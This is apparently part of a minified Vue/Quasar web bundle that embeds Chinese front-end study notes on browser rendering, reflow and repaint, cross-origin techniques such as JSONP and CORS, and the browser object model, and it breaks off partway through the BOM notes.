构建CSSOM规则树\r\n\r\n浏览器解析CSS文件并生成CSSOM，每个CSS文件都被分析成一个StyleSheet对象，每个对象都包含CSS规则。CSS规则对象包含对应于CSS语法的选择器和声明对象以及其他对象。\r\n在这个过程需要注意的是：\r\n\r\n- CSS解析可以与DOM解析同时进行。\r\n- CSS解析与`script`的执行互斥 。\r\n- 在Webkit内核中进行了`script`执行优化，只有在JS访问CSS时才会发生互斥。\r\n\r\n#### 构建渲染树（Render Tree）\r\n\r\n通过DOM树和CSS规则树，浏览器就可以通过它两构建渲染树了。浏览器会先从DOM树的根节点开始遍历每个可见节点，然后对每个可见节点找到适配的CSS样式规则并应用。\r\n有以下几点需要注意：\r\n\r\n- Render Tree和DOM Tree不完全对应\r\n- `display: none`的元素不在Render Tree中\r\n- `visibility: hidden`的元素在Render Tree中\r\n\r\n渲染树生成后，还是没有办法渲染到屏幕上，渲染到屏幕需要得到各个节点的位置信息，这就需要布局（Layout）的处理了。\r\n\r\n#### 渲染树布局(layout of the render tree)\r\n\r\n布局阶段会从渲染树的根节点开始遍历，由于渲染树的每个节点都是一个Render Object对象，包含宽高，位置，背景色等样式信息。所以浏览器就可以通过这些样式信息来确定每个节点对象在页面上的确切大小和位置，布局阶段的输出就是我们常说的盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。需要注意的是：\r\n\r\n- `float`元素，`absoulte`元素，`fixed`元素会发生位置偏移。\r\n- 我们常说的脱离文档流，其实就是脱离Render Tree。\r\n\r\n#### 渲染树绘制（Painting the render tree）\r\n\r\n在绘制阶段，浏览器会遍历渲染树，调用渲染器的`paint()`方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。\r\n\r\n#### 浏览器渲染网页的那些事儿\r\n\r\n#### 浏览器主要组件结构\r\n\r\n渲染引擎主要有两个：webkit和Gecko\r\nFirefox使用Geoko，Mozilla自主研发的渲染引擎。Safari和Chrome都使用webkit。Webkit是一款开源渲染引擎，它本来是为linux平台研发的，后来由Apple移植到Mac及Windows上。\r\n虽然主流浏览器渲染过程叫法有区别，但是主要流程还是相同的。\r\n\r\n#### 渲染阻塞\r\n\r\nJS可以操作DOM来修改DOM结构，可以操作CSSOM来修改节点样式，这就导致了浏览器在遇到`<script>`标签时，DOM构建将暂停，直至脚本完成执行，然后继续构建DOM。如果脚本是外部的，会等待脚本下载完毕，再继续解析文档。现在可以在`script`标签上增加属性`defer`或者`async`。脚本解析会将脚本中改变DOM和CSS的地方分别解析出来，追加到DOM树和CSSOM规则树上。\r\n\r\n每次去执行JavaScript脚本都会严重地阻塞DOM树的构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM还没有下载和构建，浏览器甚至会延迟脚本执行和构建DOM，直至完成其CSSOM的下载和构建。所以，`script`标签的位置很重要。\r\n\r\nJS阻塞了构建DOM树，也阻塞了其后的构建CSSOM规则树，整个解析进程必须等待JS的执行完成才能够继续，这就是所谓的JS阻塞页面。\r\n\r\n由于CSSOM负责存储渲染信息，浏览器就必须保证在合成渲染树之前，CSSOM是完备的，这种完备是指所有的CSS（内联、内部和外部）都已经下载完，并解析完，只有CSSOM和DOM的解析完全结束，浏览器才会进入下一步的渲染，这就是CSS阻塞渲染。\r\n\r\nCSS阻塞渲染意味着，在CSSOM完备前，页面将一直处理白屏状态，这就是为什么样式放在`head`中，仅仅是为了更快的解析CSS，保证更快的首次渲染。\r\n\r\n需要注意的是，即便你没有给页面任何的样式声明，CSSOM依然会生成，默认生成的CSSOM自带浏览器默认样式。\r\n\r\n当解析HTML的时候，会把新来的元素插入DOM树里面，同时去查找CSS，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序去匹配的。\r\n\r\n例如：`div p {font-size: 16px}`，会先寻找所有`p`标签并判断它的父标签是否为`div`之后才会决定要不要采用这个样式进行渲染）。\r\n所以，我们平时写CSS时，尽量用`id`和`class`，千万不要过渡层叠。\r\n\r\n#### 回流和重绘（reflow和repaint）\r\n\r\n我们都知道HTML默认是流式布局的，但CSS和JS会打破这种布局，改变DOM的外观样式以及大小和位置。因此我们就需要知道两个概念：`replaint`和`reflow`。\r\n\r\n##### reflow（回流）\r\n\r\n当浏览器发现布局发生了变化，这个时候就需要倒回去重新渲染，大家称这个回退的过程叫`reflow`。`reflow`会从`html`这个`root frame`开始递归往下，依次计算所有的结点几何尺寸和位置，以确认是渲染树的一部分发生变化还是整个渲染树。`reflow`几乎是无法避免的，因为只要用户进行交互操作，就势必会发生页面的一部分的重新渲染，且通常我们也无法预估浏览器到底会`reflow`哪一部分的代码，因为他们会相互影响。\r\n\r\n##### repaint（重绘）\r\n\r\n`repaint`则是当我们改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性时，屏幕的一部分要重画，但是元素的几何尺寸和位置没有发生改变。\r\n\r\n需要注意的是，`display:none`会触发`reflow`，而`visibility: hidden`属性则并不算是不可见属性，它的语义是隐藏元素，但元素仍然占据着布局空间，它会被渲染成一个空框。所以`visibility:hidden`只会触发`repaint`，因为没有发生位置变化。\r\n\r\n另外有些情况下，比如修改了元素的样式，浏览器并不会立刻`reflow`或`repaint`一次，而是会把这样的操作积攒一批，然后做一次`reflow`，这又叫异步`reflow`或增量异步`reflow`。但是在有些情况下，比如`resize`窗口，改变了页面默认的字体等。对于这些操作，浏览器会马上进行`reflow`。\r\n\r\n##### 引起reflow\r\n\r\n现代浏览器会对回流做优化，它会等到足够数量的变化发生，再做一次批处理回流。\r\n\r\n- 页面第一次渲染（初始化）\r\n- DOM树变化（如：增删节点）\r\n- Render树变化（如：`padding`改变）\r\n- 浏览器窗口`resize`\r\n- 获取元素的某些属性\r\n\r\n浏览器为了获得正确的值也会提前触发回流，这样就使得浏览器的优化失效了，这些属性包括`offsetLeft、offsetTop、offsetWidth、offsetHeight、 scrollTop/Left/Width/Height、clientTop/Left/Width/Height`、调用了`getComputedStyle()`。\r\n\r\n##### 引起repaint\r\n\r\n`reflow`回流必定引起`repaint`重绘，重绘可以单独触发。\r\n背景色、颜色、字体改变（注意：字体大小发生变化时，会触发回流）\r\n\r\n##### 减少reflow、repaint触发次数\r\n\r\n- 用`transform`做形变和位移可以减少`reflow`\r\n- 避免逐个修改节点样式，尽量一次性修改\r\n- 使用`DocumentFragment`将需要多次修改的DOM元素缓存，最后一次性`append`到真实DOM中渲染\r\n- 可以将需要多次修改的DOM元素设置`display:none`，操作完再显示。（因为隐藏元素不在`render`树内，因此修改隐藏元素不会触发回流重绘）\r\n- 避免多次读取某些属性\r\n- 通过绝对位移将复杂的节点元素脱离文档流，形成新的Render Layer，降低回流成本\r\n\r\n#### 几条关于优化渲染效率的建议\r\n\r\n结合上文有以下几点可以优化渲染效率。\r\n\r\n- 合法地去书写HTML和CSS ，且不要忘了文档编码类型。\r\n- 样式文件应当在`head`标签中，而脚本文件在`body`结束前，这样可以防止阻塞的方式。\r\n- 简化并优化CSS选择器，尽量将嵌套层减少到最小。\r\n- DOM 的多个读操作（或多个写操作），应该放在一起。不要两个读操作之间，加入一个写操作。\r\n- 如果某个样式是通过重排得到的，那么最好缓存结果。避免下一次用到的时候，浏览器又要重排。\r\n- 不要一条条地改变样式，而要通过改变`class`，或者`csstext`属性，一次性地改变样式。\r\n- 尽量用`transform`来做形变和位移\r\n- 尽量使用离线DOM，而不是真实的网面DOM，来改变元素样式。比如，操作`Document Fragment`对象，完成后再把这个对象加入DOM。再比如，使用`cloneNode()`方法，在克隆的节点上进行操作，然后再用克隆的节点替换原始节点。\r\n- 先将元素设为`display: none`（需要1次重排和重绘），然后对这个节点进行100次操作，最后再恢复显示（需要1次重排和重绘）。这样一来，你就用两次重新渲染，取代了可能高达100次的重新渲染。\r\n- `position`属性为`absolute`或`fixed`的元素，重排的开销会比较小，因为不用考虑它对其他元素的影响。\r\n- 只在必要的时候，才将元素的`display`属性为可见，因为不可见的元素不影响重排和重绘。另外，`visibility : hidden`的元素只对重绘有影响，不影响重排。\r\n  使用`window.requestAnimationFrame()`、`window.requestIdleCallback()`这两个方法调节重新渲染。",E={data:function(){return{MainComponent:w}}},T=E,k=Object(u["a"])(T,_,x,!1,null,"1002e786",null),C=k.exports,j=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div")},M=[],R={},L=R,O=Object(u["a"])(L,j,M,!1,null,"8219d5e2",null),A=O.exports,I=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div")},D=[],P={},N=P,q=Object(u["a"])(N,I,D,!1,null,"26379dc4",null),H=q.exports,B=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},F=[],U="## 重排和重绘\r\n\r\n### （1）写在前面：\r\n\r\n- 浏览器使用流式布局模型 (Flow Based Layout)。\r\n- 浏览器会把HTML解析成DOM，把CSS解析成CSSOM，DOM和CSSOM合并就产生了Render Tree。\r\n- 有了RenderTree，我们就知道了所有节点的样式，然后计算他们在页面上的大小和位置，最后把节点绘制到页面上。\r\n- 由于浏览器使用流式布局，对Render Tree的计算通常只需要遍历一次就可以完成，但table及其内部元素除外，他们可能需要多次计算，通常要花3倍于同等元素的时间，这也是为什么要避免使用table布局的原因之一。\r\n- 重排（CPU）必将引起重绘（GPU），重绘不一定会引起重排。\r\n\r\n### （2）重排（reflow）\r\n\r\n- 定义\r\n  - 当Render Tree中部分或全部元素的尺寸、结构、或某些属性发生改变时，浏览器重新渲染部分或全部文档的过程称为重排。\r\n- 会导致重排的操作：\r\n  - 页面首次渲染\r\n  - 浏览器窗口大小发生改变\r\n  - 元素尺寸或位置发生改变\r\n  - 元素内容变化（文字数量或图片大小等等）\r\n  - 元素字体大小变化\r\n  - 添加或者删除可见的DOM元素\r\n  - 激活CSS伪类（例如：:hover）\r\n  - 查询某些属性或调用某些方法\r\n- 一些常用且会导致重排的属性和方法：\r\n  - clientWidth、clientHeight、clientTop、clientLeft\r\n  - offsetWidth、offsetHeight、offsetTop、offsetLeft\r\n  - scrollWidth、scrollHeight、scrollTop、scrollLeft\r\n  - scrollIntoView()、scrollIntoViewIfNeeded()\r\n  - getComputedStyle()\r\n  - getBoundingClientRect()\r\n  - scrollTo()\r\n\r\n### （3）重绘 (Repaint)\r\n\r\n- 当页面中元素样式的改变并不影响它在文档流中的位置时（例如：color、background-color、visibility等），浏览器会将新样式赋予给元素并重新绘制它，这个过程称为重绘。\r\n\r\n### （4）什么情况会触发重排和重绘？\r\n\r\n- 添加、删除、更新 DOM 节点\r\n- 通过 display: none 隐藏一个 DOM 节点-触发重排和重绘\r\n- 通过 visibility: hidden 隐藏一个 DOM 节点-只触发重绘，因为没有几何变化\r\n- 移动或者给页面中的 DOM 节点添加动画\r\n- 添加一个样式表，调整样式属性\r\n- 用户行为，例如调整窗口大小，改变字号，或者滚动。\r\n\r\n### （5）性能影响\r\n\r\n- 重排比重绘的代价要更高。\r\n- 现代浏览器对频繁的重排和重绘进行了优化\r\n  - 有时即使仅仅回流一个单一的元素，它的父元素以及任何跟随它的元素也会产生回流。\r\n  - 浏览器会维护一个队列，把所有引起回流和重绘的操作放入队列中，如果队列中的任务数量或者时间间隔达到一个阈值的，浏览器就会将队列清空，进行一次批处理，这样可以把多次回流和重绘变成一次。\r\n- 获取布局的操作，会导致队列刷新，浏览器的优化效果也就没有了。要避免在布局信息改变时，获取下列属性\r\n  - clientWidth、clientHeight、clientTop、clientLeft\r\n  - offsetWidth、offsetHeight、offsetTop、offsetLeft\r\n  - scrollWidth、scrollHeight、scrollTop、scrollLeft\r\n  - width、height\r\n  - getComputedStyle()\r\n  - getBoundingClientRect()\r\n\r\n### （6）如何避免\r\n\r\n- CSS\r\n\r\n  - （1）避免使用table布局。\r\n  - （2）尽可能在DOM树的最末端改变class。\r\n  - （3）避免设置多层内联样式。\r\n  - （4）将动画效果应用到position属性为absolute或fixed的元素上。\r\n  - （5）避免使用CSS表达式（例如：calc()）。\r\n\r\n- JavaScript\r\n\r\n  - 1. 合并多次的DOM操作为单次的DOM操作\r\n\r\n    - （1）避免频繁操作样式，最好一次性重写style属性，或者将样式列表定义为class并一次性更改class属性。\r\n      - 方案2比方案1稍微有一些性能上的损耗，因为它需要查询CSS类。但方案2的维护性最好，\r\n      - 类似的操作还有通过innerHTML接口修改DOM元素的内容。不要直接通过此接口来拼接HTML代码，而是以字符串方式拼接好代码后，一次性赋值给DOM元素的innerHTML接口。\r\n\r\n  - 1. 把DOM元素离线或隐藏后修改\r\n\r\n    把DOM元素从页面流中脱离或隐藏，这样处理后，只会在DOM元素脱离和添加时，或者是隐藏和显示时才会造成页面的重绘或回流，对脱离了页面布局流的DOM元素操作就不会导致页面的性能问题。这种方式适合那些需要大批量修改DOM元素的情况。具体的方式主要有三种：\r\n\r\n    - （2）避免频繁操作DOM，创建一个documentFragment，在它上面应用所有DOM操作，最后再把它添加到文档中。\r\n      - 文档片段是一个轻量级的document对象，并不会和特定的页面关联。通过在文档片段上进行DOM操作，可以降低DOM操作对页面性能的影响，这 种方式是创建一个文档片段，并在此片段上进行必要的DOM操作，操作完成后将它附加在页面中。对页面性能的影响只存在于最后把文档片段附加到页面的这一步 操作上。\r\n    - （3）也可以先为元素设置display: none，操作结束后再把它显示出来。因为在display属性为none的元素上进行的DOM操作不会引发回流和重绘。\r\n      - 这种方式是通过隐藏页面的DOM元素，达到在页面中移除元素的效果，经过大量的DOM操作后恢复元素原来的display样式。对于这类会引起页面重绘或回流的操作，就只有隐藏和显示DOM元素这两个步骤了。\r\n    - （4）避免频繁读取会引发回流/重绘的属性，如果确实需要多次使用，就用一个变量缓存起来。\r\n      - 这种方式是把页面上的DOM元素克隆一份到内存中，然后再在内存中操作克隆的元素，操作完成后使用此克隆元素替换页面中原来的DOM元素。这样一来，影响性能的操作就只是最后替换元素的这一步操作了，在内存中操作克隆元素不会引起页面上的性能损耗。\r\n\r\n  - 1. 设置具有动画效果的DOM元素的position属性为fixed或absolute\r\n\r\n    - （5）对具有复杂动画的元素使用绝对定位，使它脱离文档流，否则会引起父元素及后续元素频繁回流。\r\n      - 把页面中具有动画效果的元素设置为绝对定位，使得元素脱离页面布局流，从而避免了页面频繁的回流，只涉及动画元素自身的回流了。这种做法可以提高动 画效果的展示性能。如果把动画元素设置为绝对定位并不符合设计的要求，则可以在动画开始时将其设置为绝对定位，等动画结束后恢复原始的定位设置。在很多的 网站中，页面的顶部会有大幅的广告展示，一般会动画展开和折叠显示。如果不做性能的优化，这个效果的性能损耗是很明显的。使用这里提到的优化方案，则可以 提高性能。\r\n\r\n  - 1. 谨慎取得DOM元素的布局信息\r\n\r\n    - 获取DOM的布局信息会有性能的损耗，所以如果存在重复调用，最佳的做法是尽量把这些值缓存在局部变量中。\r\n    - 示例\r\n      - 如上的代码中，会在一个循环中反复取得一个元素的offsetTop值，事实上，在此代码中该元素的offsetTop值并不会变更，所以会存在不必要的性能损耗。优化的方案是在循环外部取得元素的offsetTop值，相比较之前的方案，此方案只是调用了一遍元素的offsetTop值。\r\n    - 浏览器会优化连续的DOM操作\r\n      - 因为取得DOM元素的布局信息会强制浏览器刷新渲染树，并且可能会导致页面的重绘或回流，所以在有大批量DOM操作时，应避免获取DOM元素 的布局信息，使得浏览器针对大批量DOM操作的优化不被破坏。如果需要这些布局信息，最好是在DOM操作之前就取得。\r\n      - 如果把取得DOM元素的布局信息提前，因为浏览器会优化连续的DOM操作，所以实际上只会有一次的页面回流出现",J={data:function(){return{MainComponent:U}}},z=J,W=Object(u["a"])(z,B,F,!1,null,"126eade4",null),$=W.exports,G=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},V=[],Q='# 跨域\r\n\r\n## 常见浏览器跨域的解决方式大概6种\r\n\r\n### 跨域请求\r\n\r\n- 1.jsonp 需要目标服务器配合一个callback函数。\r\n- 2.CORS 需要服务器设置header ：Access-Control-Allow-Origin。\r\n- 3.nginx反向代理 这个方法一般很少有人提及，但是他可以不用目标服务器配合，不过需要你搭建一个中转nginx服务器，用于转发请求。\r\n\r\n### 访问跨域的页面\r\n\r\n- 4.window.name+iframe 需要目标服务器响应window.name。\r\n- 5.window.location.hash+iframe 同样需要目标服务器作处理。\r\n- 6.html5的 postMessage+iframe 这个也是需要目标服务器或者说是目标页面写一个postMessage，主要侧重于前端通讯。\r\n\r\n## 浏览器同源政策及其规避方法\r\n\r\n### 同源策略限制范围\r\n\r\n- （1） Cookie、LocalStorage 和 IndexDB 无法读取。\r\n- （2） DOM 无法获得。\r\n- （3） AJAX 请求不能发送。\r\n\r\n### Cookie\r\n\r\n- 解决\r\n  - 两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。\r\n  - 举例来说，A网页是http://w1.example.com/a.html，B网页是http://w2.example.com/b.html，那么只要设置相同的document.domain，两个网页就可以共享Cookie。\r\n  - document.domain = \'example.com\'; ----\x3e现在，A网页通过脚本设置一个 Cookie。document.cookie = "test1=hello"; ----\x3eB网页就可以读到这个 Cookie。var allCookie = document.cookie;\r\n- 注意\r\n  - 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。\r\n\r\n### iframe\r\n\r\n- 问题\r\n  - 如果两个网页不同源，就无法拿到对方的DOM。典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口无法通信。\r\n- 解决\r\n  - 同源的情况\r\n    - 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，拿到DOM。\r\n    - iframe访问父页面可通过window.parent得到父窗口的window对象，通过open打开的可以用window.opener，进而得到父窗口的任何东西；父窗口如果和iframe同源的，那么可通过iframe.contentWindow得到iframe的window对象\r\n  - 对于完全不同源的网站，目前有三种方法，可以解决跨域窗口的通信问题。\r\n    - 片段识别符（fragment identifier）\r\n      - 定义\r\n        - 片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。\r\n      - 用法\r\n    - window.name\r\n      - 定义\r\n        - 浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。\r\n      - 用法\r\n      - 优缺点\r\n        - 这种方法的优点是，window.name容量很大，可以放置非常长的字符串；缺点是必须监听子窗口window.name属性的变化，影响网页性能\r\n    - 跨文档通信API（Cross-document messaging）\r\n      - 定义\r\n        - 这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。\r\n        - 举例来说，父窗口[http://aaa.com](http://aaa.com/)向子窗口[http://bbb.com](http://bbb.com/)发消息，调用postMessage方法就可以了。\r\n      - 语法\r\n        - otherWindow.postMessage(message, targetOrigin);\r\n      - 基本使用\r\n        - postMessage方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即"协议 + 域名 + 端口"。也可以设为*，表示不限制域名，向所有窗口发送。\r\n        - 父窗口和子窗口都可以通过message事件，监听对方的消息。\r\n        - message事件的事件对象event，提供以下三个属性。\r\n          - event.source：发送消息的窗口\r\n          - event.origin: 消息发向的网址\r\n          - event.data: 消息内容\r\n\r\n### AJAX\r\n\r\n- 除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。\r\n- JSONP\r\n  - 基本思想\r\n    - 它的基本思想是，网页通过添加一个<script>元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。\r\n  - 应用\r\n    - 首先，网页动态插入<script>元素，由它向跨源网址发出请求。\r\n    - 上面代码通过动态添加<script>元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。\r\n    - 服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。\r\n    - 由于<script>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。\r\n  - 优缺点\r\n    - 优点\r\n      - 兼容性好，可以在更古老的浏览器中运行\r\n    - 缺点\r\n      - 只支持GET\r\n  - 总结\r\n- WebSocket\r\n  - 基本思想\r\n    - WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。\r\n- CORS\r\n  - 简单请求（simple request）\r\n    - 满足条件\r\n      - （1) 请求方法是以下三种方法之一：\r\n        - HEAD\r\n        - GET\r\n        - POST\r\n      - （2）HTTP的头信息不超出以下几种字段：\r\n        - Accept\r\n        - Accept-Language\r\n        - Content-Language\r\n        - Last-Event-ID\r\n        - Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain\r\n    - 基本流程\r\n      - （1）对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。\r\n        - 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。\r\n      - （2）如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。\r\n      - （3）如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。\r\n        - 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。\r\n          - （1）Access-Control-Allow-Origin\r\n            - 该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。\r\n          - （2）Access-Control-Allow-Credentials\r\n            - 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。\r\n          - （3）Access-Control-Expose-Headers\r\n  - 非简单请求（not-so-simple request）\r\n    - 满足条件\r\n      - 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。\r\n    - 基本流程\r\n      - （1）非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求（preflight）。要求服务器确认可以这样请求。\r\n      - （2）浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。\r\n      - "预检"请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。\r\n  - 关于Node.js对于CORS的后端配置\r\n  - 实例\r\n    - 请注意，代码与之前的区别就在于相对路径换成了其他域的绝对路径，也就是你要跨域访问的接口地址。\r\n  - 总结\r\n- 正常的AJAX请求\r\n\r\n## 跨域与安全\r\n\r\n### 1.两个误区\r\n\r\n- 1.并不是动态请求就会有跨域的问题，跨域只存在于浏览器端，不存在于安卓/ios/Node.js/python/ java等其它环境\r\n- 2.跨域并不是请求发不出去了，跨域请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了\r\n\r\n### 2.同源策略具体限制些什么呢？\r\n\r\n- 1. 不能向工作在不同源的的服务请求数据（client to server）\r\n- 1. 无法获取不同源的document/cookie等BOM和DOM，可以说任何有关另外一个源的信息都无法得到 （client to client）\r\n\r\n### 3.为什么会有同源策略呢？\r\n\r\n- 1. 为什么要限制不同源发请求？\r\n\r\n  - 假设用户登陆了bank.com，同时打开了evil.com，如果没有任何限制，evil.com可以向bank.com请求到任何信息，进而就可以在evil.com向bank.com发转账请求等。\r\n\r\n- 1. 为什么限制跨域的DOM读取？\r\n\r\n  - 如果不限制的话，那么很容易就可以伪装其它的网站，如套一个iframe或者通过window.open的方法，从而得到用户的操作和输入，如账户、密码。\r\n\r\n### 4.跨域常用方法【CORS】\r\n\r\n- 定义\r\n  - 只要浏览器检测到响应头带上了CORS，并且允许的源包括了本网站，那么就不会拦截请求响应。\r\n- CORS把请求分为两种\r\n  - 一种是简单请求\r\n  - 一种是需要触发预检请求\r\n    - 条件\r\n      - （1）使用了除GET/POST/HEAD之外的请求方式，如PUT/DELETE\r\n      - （2）使用了除Content-Type/Accept等几个常用的http头\r\n    - 预检请求使用OPTIONS方式去检查当前请求是否安全\r\n      - 代码里面只发了一个请求，但在控制台看到了两个请求，第一个是OPTIONS，服务端返回：\r\n      - 返回头里面包含了允许的请求头、请求方式、源，以及预检请求的有效期，上图是设置了20天，在这个有效期内就不用再发一个options的请求，实际上浏览器有一个最长时间，如Chrome是5分钟。如果在预检请求检测到当前请求不符合服务端设定的要求，则不会发出去了直接抛异常，这个时候就不用去发“复杂”的请求了。\r\n      - 如本源不在允许的源范围内，则会抛异常，无法获取返回结果：\r\n- 为了支持CORS，nginx可以这么配\r\n\r\n### 5.跨域常用的方法【JSONP】\r\n\r\n- 原理\r\n\r\n  当需要通讯时，本站脚本创建一个<script>元素，地址指向第三方的API网址，形如： script src="http://www.example.net/api?param1=1" /script 并提供一个回调函数来接收数据（函数名可约定，或通过地址参数传递）。 第三方产生的响应为json数据的包装（故称之为jsonp，即json padding），形如： callback({"name":"hax","gender":"Male"}) 这样浏览器会调用callback函数，并传递解析后json对象作为参数。本站脚本可在callback函数里处理所传入的数据。\r\n\r\n   \r\n\r\n  - JSONP是利用了script标签能够跨域， jsonp本身就是一个get请求，而script节点本身也是一个get请求\r\n  - 凡是拥有"src"这个属性的标签都拥有跨域的能力，比如<script>、![img]()、<iframe>\r\n  - 代码先定义一个全局函数，然后把这个函数名通过callback参数添加到script标签的src，script的src就是需要跨域的请求，然后这个请求返回可执行的JS文本：\r\n  - 由于它是一个js，并且已经定义了upldateList函数，所以能正常执行，并且跨域的数据通过传参得到。这就是JSONP的原理。\r\n\r\n- 跨站请求伪造（CSRF）\r\n\r\n  - 原理\r\n    - 由于script/iframe/img等标签的请求默认是能带上cookie（cookie里面带上了登陆验证的票token），用这些标签发请求是能够绕过同源策略的，因此就可以利用这些标签做跨站请求伪造（CSRF）\r\n    - 如果相应的网站支持GET请求，或者没有做进一步的防护措施，那么如果用户在另外一个页面登陆过了，再打开一个“有毒”的网站就中招了\r\n\r\n### 6.总结及注意\r\n\r\n- 注意\r\n  - 1.子域如mail.hello.com要跨hello.com的时候，可以显式地设置子域的document.domain值为父域的domain（或多个子域互相读取cookie）：\r\n    - 这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。\r\n  - 2.websocket是不受同源策略限制的，没有跨域的问题。\r\n  - 3.CSS的字体文件是会有跨域问题，指定CORS就能加载其它源的字体文件（通常是放在cdn上的）。\r\n  - 4.canvas动态加载的外部image，也是需要指定CORS头才能进行图片处理，否则只能画不能读取。\r\n  - 5.还可以通过window.name来实现跨域\r\n    - 在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。\r\n- 总结\r\n  - 跨域分为两种，一种是跨域请求，另一种访问跨域的页面，跨域请求可以通过CORS/JSONP等方法进行访问，跨域的页面主要通过postMesssage的方式。由于跨域请求不但能发出去还能带上cookie，所以要规避跨站请求伪造攻击的风险，特别是涉及到钱的那种请求。',K={data:function(){return{MainComponent:Q}}},X=K,Y=Object(u["a"])(X,G,V,!1,null,"6dacb625",null),Z=Y.exports,nn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},rn=[],tn="# bom\r\n\r\n## BOM浏览器对象模型\r\n\r\n### 提供很多对象，用于访问浏览器的功能，这些功能与任何网页内容无关\r\n\r\n### BOM的核心对象：windows对象\r\n\r\n- 全局作用域\r\n\r\n\t- 即是通过JavaScript访问浏览器窗口的一个接口，又是ECMAScript规定的Global对象。\r\n\t- 所有在全局作用域中声明的变量、函数都会变成window对象的属性和方法\r\n\t- 全局变量不能通过delete操作符删除，而直接在window对象上定义的属性可以\r\n\r\n- 窗口关系及框架\r\n\r\n\t- 如果页面中包含框架，则每个框架都拥有自己的window对象\r\n\t- 在frames集合中可以通过数值索引（从0开始从左到右从上到下排序）或框架名称来访问window对象\r\n\t- top对象始终指向最外层的框架，即浏览器窗口\r\n\r\n\t\t- top.frames[ 1]\r\n\r\n\t- window对象指向所在框架的特定实例\r\n\r\n\t\t- window.frame[ 1]\r\n\r\n\t- parent对象指向当前框架的直接上层框架\r\n\t- self对象始终指向window，可以和window对象互换使用\r\n\r\n- 窗口位置\r\n\r\n\t- 确定和修改window对象位置\r\n\r\n\t\t- 跨浏览器取得窗口左边和上边的位置\r\n\r\n\t\t\t- screenLeft和screenRight属性\r\n\r\n\t\t\t\t- IE/Safari/Opera/Chrome\r\n\r\n\t\t\t- screenX和screenY属性\r\n\r\n\t\t\t\t- FireFox/Safari/Chrome\r\n\r\n\t\t- 精确移动窗口位置\r\n\r\n\t\t\t- moveTo()方法\r\n\r\n\t\t\t\t- 新位置的x, y坐标值\r\n\r\n\t\t\t\t\t- window.movwTo(200, 300)\r\n\r\n\t\t\t- moveBy()方法\r\n\r\n\t\t\t\t- 接受在水平和垂直方向上移动的像素值两个参数\r\n\r\n\t\t\t\t\t- window.movwBy(-50, 100)\r\n\r\n\t\t\t- moveBy()和moveTo()都可能被浏览器禁用且不适用于框架，只能对最外层window对象使用\r\n\r\n- 窗口大小\r\n\r\n\t- 跨浏览器确定窗口大小\r\n\r\n\t\t- IE9+/FireFox/Safari/Opera/Chrome\r\n\r\n\t\t\t- innerWidth/innerHeight/outerWidth/outerHeight四个属性\r\n\t\t\t- 